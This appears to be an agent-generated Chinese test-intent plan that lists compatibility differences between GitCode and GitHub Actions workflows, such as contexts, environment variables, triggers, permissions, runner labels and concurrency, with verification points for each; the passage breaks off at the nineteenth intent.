# Compatibility diff — Test Intents

> Agent: **compat-diff** (差异猎手)
> Run: 2026-07-20-01 (FULL)
> 输入版本: gitcode-spec/COMPAT-NOTES.md (2026-07-20), github-reference/ (2026-07-20), existing-cases/cases.md (631 条, 2026-07-20)
> 输入缺失声明: `workflow-samples/` 缺失 — 无真实开源 workflow 样本佐证「这种写法现实中常见」。以下 intent 的「现实常用性」评估偏向文档语料推断，可能高估或遗漏实际高频模式。相关 intent 在「来源输入」字段中标注。
> 已有用例去重: 对 `runner.os`/`runner.arch`/PR state 命名等已有 FAIL 的兼容性用例，意图层标注交叉引用，不重复出独立 intent。

---

## 一、上下文对象差异 (`github.*` → `atomgit.*`)

### INTENT-COMPAT-001

```
意图 ID:    INTENT-COMPAT-001
维度标签:   [compatibility]
标题:       atomgit 上下文对象属性完整性：验证 atomgit.* 核心属性集是否对齐 github.*

风险点:     GitCode 上下文对象名为 `atomgit`（非 `github`），已知 `atomgit` 缺少 `github.action_path`/`github.action_ref`/`github.action_repository`/`github.actor_id`/`github.event_path`/`github.graphql_url`/`github.ref_protected`/`github.triggering_actor`/`github.workflow_ref`/`github.workflow_sha` 等字段。未声明缺失的字段是返回空字符串、null 还是报错——静默空值最危险（依赖这些字段的表达式可能静默跳过关键逻辑）。
预期系统行为: 对 GitCode 已文档化的 `atomgit.*` 属性（event_name/sha/ref/ref_name/ref_type/event/workspace/action/token/repository/repository_owner/repositoryUrl/run_id/run_number/run_attempt/workflow/head_ref/base_ref/server_url/api_url），应返回与 GitHub 语义一致的合法值。对未文档化的属性，应给出明确行为（报错或文档声明不支持），非静默空值。
Oracle 来源: GitHub 行为（一致性） — GitCode 未声明 `atomgit.*` 属性缺失处的行为，预期应与 GitHub 语义对齐或明确报错。

验证要点:
  - [正向] 已文档化的 atomgit.* 属性返回正确格式的值
  - [正向] 对 GitHub 有但 atomgit 未文档化的属性（如 `github.action_path`），访问时应有可判定的行为（字段存在返回空 vs 不存在报错）
  - [负向] 不应出现：未文档化的 atomgit.* 属性返回非预期值导致 workflow 静默走错逻辑分支

对齐方向:   一致性
优先级线索: RISK-COMPAT-01（默认值差异致行为静默不同）
来源输入:   gitcode-spec/syntax-reference/context.md; github-reference/reference/contexts.md; COMPAT-NOTES.md §2
```

---

## 二、系统环境变量前缀差异 (`GITHUB_*` → `ATOMGIT_*`)

### INTENT-COMPAT-002

```
意图 ID:    INTENT-COMPAT-002
维度标签:   [compatibility]
标题:       系统环境变量命名约定：验证 ATOMGIT_* 环境变量注入完整性

风险点:     GitCode 环境变量前缀为 `ATOMGIT_*`（如 `ATOMGIT_TOKEN`/`ATOMGIT_OUTPUT`/`ATOMGIT_ENV`/`ATOMGIT_PATH`/`ATOMGIT_STEP_SUMMARY`），GitHub 为 `GITHUB_*`。关键风险：(1) 直接搬运 GitHub workflow 中 `${{ secrets.GITHUB_TOKEN }}` 或 `$GITHUB_TOKEN` 会静默失效；(2) COMPAT-NOTES.md 指出部分文档页残留 `GITHUB_*` 措辞——文档一致性 bug；(3) 已有用例 TC-533 发现 Job env 未注入 Shell（`$VAR` 恒为 UNSET），说明变量注入机制存在缺陷；(4) 已有用例 TC-206 发现 ATOMGIT_REPOSITORY_OWNER 未注入 Runner。
预期系统行为: 所有文档声明的 `ATOMGIT_*` 系统环境变量在 Runner shell 中可用，值格式与文档一致。文档残留的 `GITHUB_*` 文案不应出现在正式产品文档的操作指引中。
Oracle 来源: GitCode 规格（`syntax-reference/workflow-commands.md` + `core-concepts/variables-secrets-context-expressions.md`）+ GitHub 行为（一致性——系统变量的语义应一致，仅前缀不同）

验证要点:
  - [正向] ATOMGIT_OUTPUT/ATOMGIT_ENV/ATOMGIT_PATH/ATOMGIT_STEP_SUMMARY 文件路径存在且可写
  - [正向] ATOMGIT_TOKEN 在 Runner 中作为环境变量可用
  - [正向] 文档中不应残留 `GITHUB_*` 引用（文档一致性）
  - [负向] $GITHUB_TOKEN / $GITHUB_OUTPUT / $GITHUB_ENV 等 GitHub 命名不应静默返回空值（应 UNSET 或报错）

对齐方向:   一致性（语义一致，仅前缀不同）
优先级线索: RISK-COMPAT-01 + RISK-USE-01（迁移摩擦）
来源输入:   gitcode-spec/syntax-reference/workflow-commands.md; gitcode-spec/core-concepts/variables-secrets-context-expressions.md; COMPAT-NOTES.md §2; 已有用例 TC-206/TC-220/TC-533
破坏级别:   none
```

---

## 三、状态检查函数语法差异（不带括号 → 语义等价但语法不同）

### INTENT-COMPAT-003

```
意图 ID:    INTENT-COMPAT-003
维度标签:   [compatibility]
标题:       状态函数括号语法：验证 success/always/failed/cancelled 不带括号时的语义等价

风险点:     GitCode 写 `${{ success }}`（无括号），GitHub 写 `${{ success() }}`（有括号）。直接搬运 GitHub workflow 的 `if: ${{ success() }}` / `${{ failure() }}` 到 GitCode 时语法可能报错或行为不同。GitCode 失败函数名为 `failed`，GitHub 为 `failure()`——命名也不同。另外 GitHub 的状态函数可作为值表达式（不仅限于 if 条件），GitCode 是否支持同样用法未知。
预期系统行为: (1) `if: ${{ success }}` 在 GitCode 中等价于 GitHub 的 `if: ${{ success() }}`；(2) `if: ${{ failed }}` 等价于 GitHub 的 `if: ${{ failure() }}`；(3) GitCode 应明确：`${{ success() }}`（带括号）是报错还是兼容；(4) 状态函数可用在 `run:` 中作为 echo 输出（验证语义一致性）。
Oracle 来源: GitCode 规格（syntax-reference/expressions.md §3.3）+ GitHub 行为（一致性——语义应等价，仅语法形式不同）

验证要点:
  - [正向] `if: ${{ success }}` 在全部前置步骤成功时执行步骤
  - [正向] `if: ${{ failed }}` 在任一前置步骤失败时执行步骤
  - [正向] `if: ${{ always }}` 无论前置步骤结果如何始终执行
  - [正向] `if: ${{ cancelled }}` 在 workflow 被取消时执行
  - [正向] ${{ success }} 作为 echo 输出能输出 true/false
  - [负向] `if: ${{ failure() }}`（GitHub 语法）应有明确报错而非静默被当作字符串处理

对齐方向:   差异确认 — GitCode 有意不同（文档已声明不带括号），需确认等价语义 + 兼容边界
优先级线索: RISK-COMPAT-01 + RISK-USE-01
来源输入:   gitcode-spec/syntax-reference/expressions.md §3.3; github-reference/reference/expressions.md; COMPAT-NOTES.md §3
```

---

### INTENT-COMPAT-004

```
意图 ID:    INTENT-COMPAT-004
维度标签:   [compatibility]
标题:       表达式函数集差异：GitCode 独有 substring/replace 函数，缺失 join/fromJSON/case

风险点:     GitCode 有 `substring(str,start,len)` / `replace(str,old,new)` 两个 GitHub 没有的内置函数；GitHub 有 `join()` / `fromJSON()` / `case()` 而 GitCode 文档未列出。(1) 使用 GitCode 独有函数的 workflow 搬到 GitHub 会断；(2) 依赖 GitHub `fromJSON()` 做类型转换的 workflow（如 GitHub docs 推荐的数值比较转换）搬到 GitCode 可能断；(3) GitHub `join()` 在对象 filters 场景（如 `github.event.issue.labels.*.name`）很常用，GitCode 是否支持需确认。
预期系统行为: 对不在 GitCode 函数表中的 GitHub 函数（join/fromJSON/case），应给出明确报错而非静默返回空或未定义行为。
Oracle 来源: GitCode 规格（syntax-reference/expressions.md §3.3）+ GitHub 行为（一致性——对未声明的差异，缺失函数应报错）

验证要点:
  - [正向] substring(str, start, len) 正确截取子串
  - [正向] replace(str, old, new) 正确替换
  - [负向] 使用 `join()` / `fromJSON()` / `case()` 不应静默通过——应报错或返回可判定的错误信息
  - [负向] 不应出现：GitHub 函数在 GitCode 中被不同语义地执行

对齐方向:   一致性（对 GitCode 未文档化的 GitHub 函数，不应有静默行为差异）
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/syntax-reference/expressions.md §3.3; github-reference/reference/expressions.md; COMPAT-NOTES.md §3
```

---

### INTENT-COMPAT-005

```
意图 ID:    INTENT-COMPAT-005
维度标签:   [compatibility]
标题:       startsWith/endsWith 大小写敏感性：GitCode 区分大小写，GitHub 不区分

风险点:     GitCode 文档明确声明 `startsWith`/`endsWith` 区分大小写；GitHub 明确声明不区分大小写。例如 `${{ startsWith('Hello', 'hello') }}` —— GitHub 返回 `true`，GitCode 返回 `false`。这是明确的行为差异，影响所有依赖大小写不敏感匹配的 `if` 条件分支。
预期系统行为: GitCode 的 startsWith/endsWith 按文档声明区分大小写；contains 的函数行为需逐项确认（GitHub contains 也是不区分大小写，GitCode 文档未明确声明 contains 的大小写行为）。
Oracle 来源: 差异声明 — GitCode docs 已显式声明「区分大小写」，与 GitHub 有意不同

验证要点:
  - [正向] startsWith('Hello', 'He') → true（首字母大写匹配）
  - [正向] startsWith('Hello', 'hello') → false（大小写不同，与 GitHub 行为相反）
  - [正向] endsWith('Hello', 'LO') → false（大小写不同）
  - [正向] contains('Hello', 'ELL') → ?（GitCode 文档未声明大小写行为，需实测确定）

对齐方向:   差异确认 — GitCode 有意不同，需确认差异已完整文档化
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/syntax-reference/expressions.md §3.3; github-reference/reference/expressions.md; COMPAT-NOTES.md §3
```

---

### INTENT-COMPAT-006

```
意图 ID:    INTENT-COMPAT-006
维度标签:   [compatibility]
标题:       表达式类型强转规则：contains/== 的松散类型比较行为对标

风险点:     GitHub 表达式有详细的 loose equality 类型强转规则（Null→0, Boolean→1/0, 空字符串→0, NaN比较总返回 false 等）。GitCode 文档仅列了运算符但没有类型强转规则描述。`${{ 'abc' == 0 }}` 这种边界在 GitHub 有明确定义，在 GitCode 是未定义行为。
预期系统行为: GitCode 的类型强转规则应与 GitHub 一致，或者明确文档化差异。关键验证点：(1) 空字符串与数字比较；(2) null 与 false/0 比较；(3) NaN 参与比较时的结果；(4) contains 对数组和字符串的类型转换。
Oracle 来源: GitHub 行为（一致性 —— GitCode 未声明差异，默认应与 GitHub 对齐）

验证要点:
  - [正向] 空字符串 `''` == 0 的行为应明确（GitHub: true，GitCode: 待验证）
  - [正向] `null` 表达式的真值性应明确（GitHub: falsy）
  - [正向] 数组中 contains 的匹配行为应一致
  - [负向] 不应出现：同一表达式在 GitCode 和 GitHub 得到不同布尔结果

对齐方向:   一致性
优先级线索: RISK-COMPAT-01
来源输入:   github-reference/reference/expressions.md; gitcode-spec/syntax-reference/expressions.md; COMPAT-NOTES.md §3
```

---

## 四、PR 触发事件 types 命名/取值差异

### INTENT-COMPAT-007

```
意图 ID:    INTENT-COMPAT-007
维度标签:   [compatibility]
标题:       pull_request types 命名差异：open/update/merge vs opened/synchronize/reopened/closed

风险点:     GitCode `pull_request.types` 取值为 `[merge, open, reopen, update]`，默认 `[open, reopen, update]`。GitHub 取值为 `opened/synchronize/reopened/closed` 等（动词过去式），默认 `[opened, synchronize, reopened]`。双重差异：(1) 命名不同（open vs opened, update vs synchronize）；(2) 取值集合不同（GitCode 有 merge 且 merge 不在默认中，GitHub 有 synchronize 且在默认中）。已有用例 TC-064 发现 PR state 字段返回 `opened`（GitHub 命名）而非 `open`（GitCode 文档声明的命名）——说明实际实现可能混用命名。
预期系统行为: (1) 每个 types 值应触发对应的 PR 事件动作；(2) 未指定 types 时的默认行为应与文档一致；(3) `types: [opened]`（GitHub 命名）应明确报错还是被兼容；(4) PR merge 事件应可靠触发。已有用例 TC-561 发现 merge 未触发 pull_request 的 merge 独立 Job——疑似 bug。
Oracle 来源: GitCode 规格（syntax-reference/trigger-events.md §1.2 + writing-pipelines/configure-triggers.md）+ GitHub 行为（差异确认——命名/取值有意不同）

验证要点:
  - [正向] types: [open] → PR 创建时触发
  - [正向] types: [update] → PR 源分支新提交时触发
  - [正向] types: [reopen] → PR 重新打开时触发
  - [正向] types: [merge] → PR 合并时触发
  - [正向] 不指定 types → 默认 [open, reopen, update] 下三个动作都触发
  - [负向] types: [opened, synchronize, reopened]（GitHub 命名）应有明确行为：报错 / 兼容映射 / 静默忽略

对齐方向:   差异确认 — GitCode 有意不同（命名+取值均不同），需确认实际行为与文档的一致性
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/syntax-reference/trigger-events.md; github-reference/reference/events.md; COMPAT-NOTES.md §5; 已有用例 TC-064/TC-234/TC-561
破坏级别:   none
```

---

### INTENT-COMPAT-008

```
意图 ID:    INTENT-COMPAT-008
维度标签:   [compatibility]
标题:       pull_request_target 语义对齐：base 上下文运行 + forks PR 完整权限隔离

风险点:     pull_request_target 是 Actions 最高危事件类型——在 base 分支上下文运行、拥有完整权限、可访问 secrets，fork PR 也能触发。GitCode 文档描述的隔离语义与 GitHub 一致（base 上下文、完整权限、secrets 可访问）。但已有用例 TC-461/TC-463 发现 pull_request_target 的 open 事件未触发或运行失败——疑似实现不完整。安全命脉：若隔离行为与文档描述不符，是 P0 风险。
预期系统行为: (1) pull_request_target 使用目标分支的 workflow 版本运行；(2) ATOMGIT_TOKEN 拥有 permissions 声明的完整权限（非降级为 read-only）；(3) fork PR 的 pull_request_target 也可访问项目 secrets；(4) checkout 默认 checkout base 分支代码（非 PR 合并提交）；(5) 如果显式 checkout PR head.sha 并执行其脚本 = 高权限跑不可信代码。
Oracle 来源: 差异确认 — GitCode 文档声明的 pull_request_target 语义与 GitHub 一致，但实现疑似不完全（已有 FAIL 用例），需实测确认。

验证要点:
  - [正向] pull_request_target 触发的 workflow 使用 main 分支 workflow 文件版本执行
  - [正向] pull_request_target 下的 ATOMGIT_TOKEN 拥有写权限（可推送/评论）
  - [正向] fork PR 的 pull_request_target 可访问项目级 secrets
  - [负向] pull_request_target 的 PR open 事件应可靠触发（已有 TC-461/TC-463 的 FAIL 未修复前为 P0）

对齐方向:   差异确认 — 语义与 GitHub 一致，实现待验证
优先级线索: RISK-SEC-01（fork PR 读到仓库 secrets——安全命脉，若实现与文档不一致则升级为 P0）
来源输入:   gitcode-spec/security-permissions/pr-mr-pipeline-security.md; github-reference/security/pull_request_target.md; COMPAT-NOTES.md §5/§8; 已有用例 TC-461/TC-463/TC-561
破坏级别:   none
```

---

## 五、permissions 权限域命名差异

### INTENT-COMPAT-009

```
意图 ID:    INTENT-COMPAT-009
维度标签:   [compatibility, security]
标题:       permissions 权限域命名差异：project/pr/repository vs contents/pull-requests/actions

风险点:     GitCode permissions 用 `project`/`pr`/`issue`/`note`/`repository`/`hook`（值 read/write/none）；GitHub 用 `contents`/`pull-requests`/`issues`/`actions`/`packages` 等 16-18 个域。直接搬运 GitHub workflow 的 permissions 块会因不识别 GitHub 域名而报错或静默忽略——如果是静默忽略，安全影响极大（以为限制了权限实际没有）。GitCode 仅 6 个域，粒度假粗于 GitHub。
预期系统行为: (1) GitCode 识别的 6 个域正确控制 ATOMGIT_TOKEN 权限；(2) 使用了 GitHub 权限域名（如 `contents: read`）的工作流应报错，非静默忽略；(3) 快捷语法 `read-all`/`write-all`/`{}` 语义与 GitHub 一致。
Oracle 来源: 差异确认 — GitCode 权限域命名与粒度均有意不同

验证要点:
  - [正向] `permissions: {repository: read}` → ATOMGIT_TOKEN 可以 clone 但不能 push
  - [正向] `permissions: {pr: write}` → ATOMGIT_TOKEN 可以操作 PR
  - [正向] `permissions: read-all` / `write-all` / `{}` 快捷语法语义正确
  - [负向] 使用 GitHub 权限域名（如 `contents: read`）时 workflow 应报错（解析失败），非静默忽略

对齐方向:   差异确认 — GitCode 有意不同，权限域名不兼容
优先级线索: RISK-SEC-01 + RISK-COMPAT-01（安全 + 兼容性双维度）
来源输入:   gitcode-spec/security-permissions/token-permissions.md; github-reference/reference/workflow-syntax.md; COMPAT-NOTES.md §6
破坏级别:   none
```

---

## 六、Runner 标签格式差异

### INTENT-COMPAT-010

```
意图 ID:    INTENT-COMPAT-010
维度标签:   [compatibility]
标题:       runs-on 标签格式差异：三段式标签 vs 单标签，托管规格对标

风险点:     GitCode 用三段式 `${os-version},${arch},${flavor}`（如 `{ubuntu-24,x64,small}`）或 `default`；GitHub 用 `ubuntu-latest`/`windows-latest` 等单标签。直接搬运 GitHub workflow 的 `runs-on: ubuntu-latest` 到 GitCode 会因不匹配而无法调度。GitCode `default` 等效 `[ubuntu-latest, x64, small]`。已有用例 TC-094/TC-095 发现 `runner.os` 返回 `linux`（非 `Linux`）和 `runner.arch` 返回 `x86_64`（非 `X64`）——runner 上下文值也与 GitHub 不同。
预期系统行为: (1) GitCode 三段式标签正确匹配 runner；(2) `runs-on: default` 等价于官方托管默认规格；(3) 使用 GitHub 单标签格式（如 `ubuntu-latest`）时应有明确报错；(4) 托管规格 `slim`/`small`/`medium` 的资源配额与文档一致。
Oracle 来源: 差异确认 — GitCode runner 标签体系有意不同

验证要点:
  - [正向] `runs-on: {ubuntu-24,x64,small}` 正确分配到托管 runner
  - [正向] `runs-on: default` 等价分配到默认 runner
  - [正向] `runs-on: [self-hosted, linux, x64]` 正确匹配自托管 runner
  - [负向] `runs-on: ubuntu-latest`（GitHub 格式）应有明确报错

对齐方向:   差异确认 — GitCode 有意不同
优先级线索: RISK-USE-01 + RISK-COMPAT-01
来源输入:   gitcode-spec/runner-management/selecting-runner-labels.md; github-reference/reference/workflow-syntax.md; COMPAT-NOTES.md §7; 已有用例 TC-094/TC-095
破坏级别:   none
```

---

## 七、runner 上下文字段值格式差异

### INTENT-COMPAT-011

```
意图 ID:    INTENT-COMPAT-011
维度标签:   [compatibility]
标题:       runner 上下文字段值格式差异：os 大小写 / arch 命名约定 / name 存在性 / 扩展字段

风险点:     已有用例 TC-094/TC-095/TC-137/TC-138 发现：(1) `runner.os` 返回 `linux`（小写）而非 `Linux`；(2) `runner.arch` 返回 `x86_64` 而非 `X64`。GitHub 约定 `runner.os` 为 `Linux`/`Windows`/`macOS`（首字母大写）；`RUNNER_ARCH` 为 `X86`/`X64`/`ARM`/`ARM64`。GitCode 的格式不一致可能导致依赖 `.os == 'Linux'` 的条件判断静默失败。
预期系统行为: (1) `runner.os` 返回值格式应与文档声明一致；(2) 如果有意使用小写（如 `linux`），应明确文档化差异；(3) `runner.arch` 同理——要么返回 `X64`，要么文档声明返回 `x86_64`；(4) `runner.name` 应返回有意义的 runner 标识；(5) `runner.temp` / `runner.tool_cache` 路径存在且可写。
Oracle 来源: 差异确认 — 已有用例发现实际值与 GitHub/文档不一致，需定性为 bug 还是有意差异

验证要点:
  - [正向] runner.os 返回值与 GitCode 文档一致（若文档说 Linux 但实际返回 linux，则要么修实现要么修文档）
  - [正向] runner.arch 返回值与 GitCode 文档一致
  - [正向] runner.temp / runner.tool_cache / runner.name 有合法值
  - [负向] 不应出现：runner.os 在同一个平台的不同 run 中返回不同格式的值

对齐方向:   差异确认 — 需澄清是 bug 还是有意差异
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/syntax-reference/context.md; github-reference/reference/contexts.md; github-reference/reference/variables.md; COMPAT-NOTES.md; 已有用例 TC-094/TC-095/TC-137/TC-138
破坏级别:   none
```

---

## 八、内置 Action 引用格式与等价行为差异

### INTENT-COMPAT-012

```
意图 ID:    INTENT-COMPAT-012
维度标签:   [compatibility]
标题:       内置 action 引用格式差异：checkout vs actions/checkout@v4，等价行为验证

风险点:     GitCode 用无 owner 短名（`checkout`/`setup-node`/`setup-java`/`setup-go`/`setup-python`/`cache`/`upload-artifact`/`download-artifact`）；GitHub 用 `actions/checkout@v4` 等带 owner+version。直接搬运 GitHub workflow 的 `uses: actions/checkout@v4` 到 GitCode 可能不识别。已有用例 TC-310 发现 setup-java 插件不存在。action 运行时仅列 `node16`，GitHub 还支持 `node20`/`docker`/`composite`。
预期系统行为: (1) GitCode 内置 action 短名正确解析并执行；(2) 等价 action 的输入参数（如 checkout 的 `ref`/`path`/`fetch-depth`）行为与 GitHub 对应 action 一致；(3) 每个内置 action 的输出（如 checkout 的 `steps.checkout.outputs`）格式与 GitHub 一致；(4) `runs.using` 仅支持 `node16`——其他值应报错。
Oracle 来源: 差异确认 — GitCode action 引用格式有意不同；等价行为应与 GitHub action 对齐

验证要点:
  - [正向] `uses: checkout` 正确 checkout 代码，支持 ref/fetch-depth/path 参数
  - [正向] `uses: checkout` 的输出 (outputs) 与 GitHub actions/checkout 一致
  - [正向] `uses: setup-node`/`setup-python`/`setup-go`/`setup-java` 存在且可用
  - [正向] `uses: cache`/`upload-artifact`/`download-artifact` 存在且可用
  - [负向] `uses: actions/checkout@v4`（GitHub 引用格式）应有明确报错
  - [负向] setup-java 应存在（已有用例 TC-310 发现不存在——作为缺陷追踪）

对齐方向:   差异确认（引用格式有意不同）+ 一致性（等价行为应与 GitHub action 对齐）
优先级线索: RISK-COMPAT-01 + RISK-USE-01
来源输入:   gitcode-spec/writing-pipelines/using-actions.md; gitcode-spec/action-development/; COMPAT-NOTES.md §10; 已有用例 TC-310/TC-502/TC-499
破坏级别:   none
```

---

## 九、工作流文件目录差异

### INTENT-COMPAT-013

```
意图 ID:    INTENT-COMPAT-013
维度标签:   [compatibility, usability]
标题:       工作流文件目录差异：.gitcode/workflows/ vs .github/workflows/，仅识别 .yml/.yaml

风险点:     GitHub workflow 文件放 `.github/workflows/`，GitCode 放 `.gitcode/workflows/`。迁移第一摩擦点：直接把仓库从 GitHub 搬到 GitCode，workflow 文件不会被识别。同时需要验证两个目录同时存在时的行为（是否都识别、优先级如何）以及 `.github/workflows/` 中的文件是否完全不解析。
预期系统行为: (1) `.gitcode/workflows/*.yml` 和 `.gitcode/workflows/*.yaml` 被识别为 workflow 文件；(2) `.github/workflows/` 下的文件不应被识别；(3) `.gitcode/workflows/` 下的非 `.yml`/`.yaml` 文件被忽略；(4) 不存在的目录或空目录时不报错。
Oracle 来源: 差异确认 — GitCode 目录有意不同

验证要点:
  - [正向] `.gitcode/workflows/ci.yml` 被正确识别和触发
  - [正向] `.gitcode/workflows/ci.yaml` 也被识别
  - [正向] `.gitcode/workflows/readme.md` 被忽略
  - [负向] `.github/workflows/ci.yml` 不应被识别为触发源
  - [负向] 两目录同时存在时，GitHub 目录的 workflow 不应被意外执行

对齐方向:   差异确认 — GitCode 有意不同
优先级线索: RISK-USE-01
来源输入:   gitcode-spec/writing-pipelines/workflow-file-location-structure.md; COMPAT-NOTES.md §1
破坏级别:   none
```

---

## 十、默认值差异：shell、permissions、concurrency

### INTENT-COMPAT-014

```
意图 ID:    INTENT-COMPAT-014
维度标签:   [compatibility]
标题:       默认值差异：defaults.run.shell 与默认 permissions 行为的对齐

风险点:     GitHub `defaults.run.shell` 未指定时默认行为是 `bash -e {0}`（即 bash with `-e` flag）。GitCode 文档字段表中列出 `defaults` 字段但未明确默认 shell 的行为（spec 说支持 bash 但不清楚是否也默认 `bash -e`）。另外 GitHub 未声明 permissions 时有默认权限范围（permissive），GitCode 的默认 permissions 范围不确定——可能更宽松或更严格。
预期系统行为: (1) 未指定 `defaults.run.shell` 时，`run:` step 应使用 bash 且行为应与 GitHub 的 `bash -e {0}` 一致；(2) 未声明 `permissions` 时，ATOMGIT_TOKEN 的默认权限范围应文档化；(3) `defaults.run.working-directory` 未指定时应为 `$ATOMGIT_WORKSPACE`。
Oracle 来源: GitHub 行为（一致性 — GitCode 未声明差异，默认应与 GitHub 对齐）

验证要点:
  - [正向] 未指定 shell 的 `run:` step 在 bash 中执行
  - [正向] `run: exit 1` 应导致 step 标记为失败（bash -e 行为）
  - [正向] 未声明 permissions 时 ATOMGIT_TOKEN 的实际权限范围应可观测
  - [负向] 不应出现：未指定 shell 时 step 在 sh/dash 等非预期 shell 中执行

对齐方向:   一致性（GitCode 未声明差异，默认行为应与 GitHub 对齐）
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/writing-pipelines/workflow-file-location-structure.md; github-reference/reference/workflow-syntax.md; COMPAT-NOTES.md
破坏级别:   none
```

---

### INTENT-COMPAT-015

```
意图 ID:    INTENT-COMPAT-015
维度标签:   [compatibility]
标题:       concurrency 并发控制模型差异：GitCode enable/max/exceed-action vs GitHub group/cancel-in-progress

风险点:     GitCode concurrency 用 `enable: true` + `max: N` + `exceed-action: QUEUE/CANCEL` 模型；GitHub 用 `group: <key>` + `cancel-in-progress: true/false` + `queue` 模型。两种模型在功能上大致对应但语义细节不同：(1) GitHub 的 group key 支持动态表达式（如 `${{ github.workflow }}-${{ github.ref }}`）实现细粒度分组，GitCode 是否支持同等粒度？(2) GitHub `cancel-in-progress` 只在同一 group 内取消，GitCode `exceed-action: CANCEL` 是全取消还是按 group？(3) GitHub queue 支持 `single`/`max` 配置，GitCode 仅 `max` 数字没有 queue 模式。
预期系统行为: (1) GitCode concurrency 能正确限制同一 workflow 的并行运行数；(2) `exceed-action: QUEUE` 时超额的 run 排队而非取消；(3) `exceed-action: CANCEL` 时取消超额的 run；(4) 并发分组粒度（按 branch/ref 区分）的行为与文档一致。
Oracle 来源: 差异确认 — GitCode concurrency 模型有意不同于 GitHub

验证要点:
  - [正向] `concurrency: {enable: true, max: 1, exceed-action: QUEUE}` 下同时触发多个 run，仅 1 个执行其余排队
  - [正向] `concurrency: {enable: true, max: 3, exceed-action: CANCEL}` 下触发 5 个 run，2 个被取消
  - [正向] 排队的 run 在前一个完成后自动开始
  - [负向] concurrency max=0 或负数的边界行为的报错质量（不应静默通过）

对齐方向:   差异确认 — GitCode 有意不同，语义模型与 GitHub 不同
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/writing-pipelines/workflow-file-location-structure.md; github-reference/reference/workflow-syntax.md; COMPAT-NOTES.md
破坏级别:   none
```

---

## 十一、inputs 类型限制

### INTENT-COMPAT-016

```
意图 ID:    INTENT-COMPAT-016
维度标签:   [compatibility]
标题:       workflow_dispatch/workflow_call inputs 类型限制：仅 string vs boolean/choice/number/environment

风险点:     GitCode `inputs` 仅支持 `type: string`；GitHub 支持 `boolean`/`choice`/`number`/`environment`/`string`。直接搬运使用 `type: boolean` 或 `type: number` 的 GitHub workflow 可能：(1) 解析报错；(2) 静默当 string 处理——最危险，`if: ${{ inputs.dry_run }}` 在 GitHub 为 false 时不执行，在 GitCode 可能被当作字符串 "false" 强制为真值 (truthy)。
预期系统行为: (1) 非 string 类型的 inputs 应明确报错；(2) string 类型 inputs 的 required/default 语义正确；(3) 已有用例 TC-014 验证了 `type: string` 的正确性，需要进一步验证非 string 类型的报错质量。
Oracle 来源: 差异确认 — GitCode 有意仅支持 string 类型

验证要点:
  - [正向] `type: string` 的 inputs 正确传递和默认值
  - [负向] `type: boolean` 的 inputs 不应静默当 string 处理——应报错
  - [负向] `type: number` / `type: choice` / `type: environment` 同理应报错
  - [负向] 错误信息应指明「GitCode 仅支持 string 类型」，非泛化的 YAML 解析错误

对齐方向:   差异确认 — GitCode 有意限制为 string only
优先级线索: RISK-USE-01 + RISK-COMPAT-01
来源输入:   gitcode-spec/writing-pipelines/configure-triggers.md; github-reference/reference/workflow-syntax.md; COMPAT-NOTES.md §9; 已有用例 TC-014
破坏级别:   none
```

---

## 十二、GitCode 独有编排机制：stages + post

### INTENT-COMPAT-017

```
意图 ID:    INTENT-COMPAT-017
维度标签:   [compatibility]
标题:       stages 阶段机制：阶段间串行语义 + fail_fast 正确性

风险点:     `stages` 是 GitCode 独有的顶层编排机制——阶段间串行执行、阶段内 job 并行。GitHub 没有 stages 概念，依赖 `needs` DAG 实现等价编排。关键风险：(1) stages + needs 同时存在时的优先级和交互语义——是 needs 在阶段内生效还是跨阶段？(2) `stages.fail_fast` 与 `strategy.fail-fast` 两种 fail_fast 混淆风险。已有用例 TC-486/481/499 发现 `needs:` 指向 matrix 父 job 导致"任务初始化错误"——说明 job 依赖在 matrix 场景下有问题。
预期系统行为: (1) stages 按声明顺序串行执行，前一阶段全部成功后进入下一阶段；(2) `fail_fast: true` 时，阶段内任一 job 失败即跳过后续阶段；(3) stages + needs 同时存在时的语义应文档化（谁优先）；(4) stages 内 jobs 支持完整 job 语义（needs/if/matrix 等）。
Oracle 来源: 差异确认 — stages 是 GitCode 独有机制，语义由 GitCode 规格定义

验证要点:
  - [正向] 3 个 stage 按 build → test → deploy 顺序执行
  - [正向] stage 内多个 job 并行执行
  - [正向] `fail_fast: true` 下 build 阶段失败 → test/deploy 不执行
  - [正向] `fail_fast: false` 下 build 失败 → test/deploy 继续
  - [负向] stages + needs 交互不应出现未文档化的行为（优先级冲突）

对齐方向:   差异确认 — stages 是 GitCode 独有机制，无 GitHub 对等物
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/writing-pipelines/workflow-file-location-structure.md; gitcode-spec/writing-pipelines/configure-dependencies-order.md; COMPAT-NOTES.md §4; 已有用例 TC-486/481/499
破坏级别:   none
```

---

### INTENT-COMPAT-018

```
意图 ID:    INTENT-COMPAT-018
维度标签:   [compatibility]
标题:       post 后处理阶段：run_always 默认行为 + 与 always() 函数的交互

风险点:     GitCode 顶层 `post` 阶段是独有机制，默认 `run_always: true`（无论成功失败均执行）。GitHub 无等价顶层字段——类似效果通过 `if: ${{ always() }}` 实现。关键风险：(1) post 中 `run_always: false` 与 step 级 `if: ${{ always }}` 同时存在时的行为；(2) post 阶段 job 失败是否影响 workflow 最终结论；(3) post 中能否访问前置 job 的 outputs。
预期系统行为: (1) `run_always: true`（默认）时 post 始终执行；(2) `run_always: false` 时仅在 workflow 成功时执行 post；(3) post 中 job 失败不影响 workflow 最终状态（或行为文档化）。
Oracle 来源: 差异确认 — post 是 GitCode 独有机制

验证要点:
  - [正向] `post.run_always: true` 下 workflow 失败后 post 仍执行
  - [正向] `post.run_always: false` 下 workflow 失败后 post 不执行
  - [正向] post 中步骤可以发送通知/上传 artifact
  - [负向] post 失败不应导致整个 workflow 状态变为 failure（除非文档声明如此）

对齐方向:   差异确认 — GitCode 独有
优先级线索: RISK-COMPAT-01
来源输入:   gitcode-spec/writing-pipelines/workflow-file-location-structure.md; COMPAT-NOTES.md §4
破坏级别:   none
```

---

## 十三、触发器路径匹配边界

### INTENT-COMPAT-019

```
意图 ID:    INTENT-COMPAT-019
维度标签:   [compatibility]
标题:       paths 过滤器语义差异：匹配前 300 文件上限 + 通配行为 + 排除语法

